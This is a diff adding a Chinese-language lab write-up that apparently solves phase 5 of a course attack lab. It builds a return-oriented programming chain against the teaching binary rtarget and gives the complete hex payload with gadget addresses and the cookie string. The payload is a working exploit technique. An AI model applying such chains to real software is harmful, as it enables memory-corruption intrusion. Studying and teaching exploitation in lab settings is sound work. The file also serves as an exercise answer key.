@@ -151,13 +151,80 @@ movq %rax, %rdi #把cookie值 传递给rdi   这条指令出现在0x4019c5中
 ./hex2raw < rl2hex.txt > rl2raw.txt
 
 3. 运行程序：
-./ctarget -q < rl2raw.txt
+./rtarget -q < rl2raw.txt
 
 
 
 # phase5 (return-oriented programming level3)
 
+要求：在使用了随机初始栈长度，以及 不能执行栈位置的内容后，使用ROP来调用touch3()函数。
+这里可以使用movq, popq, ret和nop(0x90)指令。并新增了movl指令 和 一些nop操作的指令。
+也能使用farm中出现到的代码。
+
+首先，先观察 新增的指令。
+D表格中的指令，明显是在结尾的后缀，前缀是movl里面的指令。
+然后一个个搜，发现这些是可以用的：
+
+<img src="mdpics/rl3CD.png">
+
+(黄色部分是没有对应的movl前缀的，不会用到的)
+(绿色是既有movq，又有movl的指令)
 
 
+再观察farm.s中，比较有可能用到的指令是：
+4019d6:	lea (%rdi,%rsi,1),%rax
 
+
+解题思路：要 给rdi传递栈上 cookie的位置，又因为rsp是不断移动的，所以 可以考虑给rdi赋一个初始值(栈的位置在比较高的地方，所以地址是的高32位不能丢，所以必须用movq的指令)，再 通过加上 一个偏移的方法来指向正确的cookie的位置(通过 lea那条指令)。
+
+倒过来推：
+
+最后一步肯定是touch3的位置  
+然后是 movq %rax, %rdi #为touch3传递参数  
+给rax传值： lea (%rdi, %rsi, 1) %rax  
+
+给rsi传值： movl %ecx, %esi  
+给ecx传值： movl %edx, %ecx  
+给edx传值： movl %eax, %edx  
+给rax传值： popq %rax # 这个就是那个偏移，偏移是固定的，可以计算的  
+
+给rdi传值： movq %rax, %rdi #这里是rdi，刚好可以存的是初始地址(如果是edi就会丢失高32位)  
+给rax传值： movq %rsp, %rax #因为栈的位置是很高的位置，所以高32位是不能丢的
+
+
+栈的内容：  
+
+<img src="mdpics/rl3.png" height="480" width="290">
+
+1. 编写文件 rl3hex.txt。内容为：  
+    41 42 43 44 45 46 47 48 49 50  
+    41 42 43 44 45 46 47 48 49 50  
+    41 42 43 44 45 46 47 48 49 50  
+    41 42 43 44 45 46 47 48 49 50 /\* 刚好40个字节 \*/  
+    06 1a 40 00 00 00 00 00  
+    c5 19 40 00 00 00 00 00  
+    ab 19 40 00 00 00 00 00  
+    48 00 00 00 00 00 00 00  
+    dd 19 40 00 00 00 00 00  
+    34 1a 40 00 00 00 00 00  
+    27 1a 40 00 00 00 00 00  
+    d6 19 40 00 00 00 00 00  
+    c5 19 40 00 00 00 00 00  
+    fa 18 40 00 00 00 00 00  
+    35 39 62 39 39 37 66 61 00  
+    /\*   
+    movq %rsp, %rax  
+    movq %rax, %rdi  
+    popq %rax  
+    movl %eax, %edx  
+    movl %edx, %ecx  
+    movl %ecx, %esi  
+    lea (%rdi, %rsi, 1),%rax  # %rsi存的是偏移，%rdi存的是rsp2的位置  
+    \*/
+
+2. 把 rl3hex.txt 转换成 rl3raw.txt：
+./hex2raw < rl3hex.txt > rl3raw.txt
+
+3. 运行程序：
+./rtarget -q < rl3raw.txt
 
